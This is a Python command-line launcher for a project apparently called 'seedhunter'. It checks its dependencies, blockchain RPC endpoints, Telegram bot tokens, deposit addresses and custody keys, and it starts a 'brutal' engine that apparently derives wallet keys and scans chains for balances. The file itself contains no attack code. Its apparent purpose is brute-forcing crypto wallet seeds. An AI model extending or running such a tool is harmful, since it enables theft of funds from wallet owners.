"""Single entry point. Everything you need to run is one of these verbs.

    python -m rpc_service.console doctor
    python -m rpc_service.console preflight -p brutal
    python -m rpc_service.console engine -p brutal
    python -m rpc_service.console api
    python -m rpc_service.console mini        # API + tunnel + Mini App bot
    python -m rpc_service.console command     # the project's own command bot
"""
from __future__ import annotations

import asyncio
import importlib
import os
import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
MODULES = ["httpx", "yaml", "dotenv", "telegram", "solders", "eth_account", "fastapi",
           "uvicorn"]


def _line(ok: str, label: str, detail: str = "") -> None:
    mark = {"pass": "PASS", "warn": "WARN", "fail": "FAIL"}[ok]
    print(f"  [{mark}] {label}{(' — ' + detail) if detail else ''}")


def doctor() -> int:
    from . import bridge

    print("\nDOCTOR\n------")
    failures = 0
    if sys.version_info[:2] >= (3, 12):
        _line("pass", "python", sys.version.split()[0])
    else:
        failures += 1
        _line("fail", "python", f"{sys.version.split()[0]} (need 3.12+)")

    for name in MODULES:
        try:
            importlib.import_module(name)
            _line("pass", f"import {name}")
        except Exception as exc:
            failures += 1
            _line("fail", f"import {name}", type(exc).__name__)

    for mod in ("seedhunter.config", "seedhunter.derive", "seedhunter.chains",
                "seedhunter.store", "seedhunter.notifier"):
        try:
            importlib.import_module(mod)
            _line("pass", f"project {mod}")
        except Exception as exc:
            failures += 1
            _line("fail", f"project {mod}", type(exc).__name__)

    cfg = bridge.repo_config()
    chains = [k for k, v in (cfg.get("chains") or {}).items()
              if isinstance(v, dict) and v.get("enabled")]
    if chains:
        _line("pass", "config.yaml", f"{len(chains)} chain(s) enabled")
    else:
        failures += 1
        _line("fail", "config.yaml", "no enabled chain")

    for chain in chains:
        eps = [e for e in ((cfg.get("chains") or {}).get(chain) or {}).get("endpoints") or [] if e]
        env = os.getenv({"ethereum": "RPC_ETH", "bsc": "RPC_BSC", "polygon": "RPC_POLYGON",
                         "base": "RPC_BASE", "arbitrum": "RPC_ARBITRUM",
                         "optimism": "RPC_OPTIMISM", "avalanche": "RPC_AVAX",
                         "solana": "RPC_SOLANA"}.get(chain, ""), "")
        _line("pass" if (eps or env) else "warn", f"endpoints {chain}",
              f"{len(eps)} public" + (" + env override" if env else ""))

    checks = [
        ("SH_TG_DASH_BOT_TOKEN", "mini app bot"),
        ("TELEGRAM_BOT_TOKEN", "command bot"),
        ("SH_ADMIN_TOKEN", "admin endpoints"),
        ("SH_DEPOSIT_BTC", "BTC deposits"),
        ("SH_DEPOSIT_ETH", "ETH deposits"),
        ("SH_DEPOSIT_SOL", "SOL deposits"),
        ("SH_DEPOSIT_BNB", "BNB deposits"),
        ("SH_KMS_KEY_EVM", "EVM custody"),
        ("SH_KMS_KEY_SOL", "SOL custody"),
    ]
    for key, label in checks:
        if os.getenv(key):
            _line("pass", label)
        else:
            _line("warn", label, f"{key} unset")

    if os.getenv("TELEGRAM_BOT_TOKEN") and os.getenv("SH_TG_DASH_BOT_TOKEN"):
        if os.getenv("TELEGRAM_BOT_TOKEN") == os.getenv("SH_TG_DASH_BOT_TOKEN"):
            failures += 1
            _line("fail", "bot tokens distinct", "two pollers on one token get 409")
        else:
            _line("pass", "bot tokens distinct")

    print(f"\n{'READY' if not failures else f'{failures} blocking problem(s)'}\n")
    return 0 if not failures else 1


def _engine(args: list[str]) -> int:
    from . import brutal
    sys.argv = ["brutal", *args]
    brutal.main()
    return 0


def main() -> None:
    argv = sys.argv[1:]
    if not argv:
        print(__doc__)
        raise SystemExit(2)
    verb, rest = argv[0], argv[1:]
    if verb == "doctor":
        raise SystemExit(doctor())
    if verb == "preflight":
        from . import preflight
        sys.argv = ["preflight", *rest]
        preflight.main()
        return
    if verb == "engine":
        _engine(rest)
        return
    if verb == "api":
        os.execv(sys.executable, [sys.executable, "-m", "uvicorn", "rpc_service.app:app",
                                  "--host", os.getenv("SH_HOST", "127.0.0.1"),
                                  "--port", os.getenv("SH_PORT", "8080"),
                                  "--proxy-headers"])
    if verb == "mini":
        from . import tunnel
        asyncio.run(tunnel.serve(int(os.getenv("SH_PORT", "8080")),
                                 os.getenv("SH_TG_DASH_BOT_TOKEN", ""),
                                 os.getenv("TELEGRAM_CHAT_ID")))
        return
    if verb == "command":
        subprocess.run([sys.executable, "-m", "seedhunter.cli", "bot"], cwd=str(ROOT), check=False)
        return
    if verb == "mini-bot":
        subprocess.run([sys.executable, "-m", "rpc_service.dashboard_bot"],
                       cwd=str(ROOT), check=False)
        return
    print(f"unknown verb {verb!r}\n{__doc__}")
    raise SystemExit(2)


if __name__ == "__main__":
    main()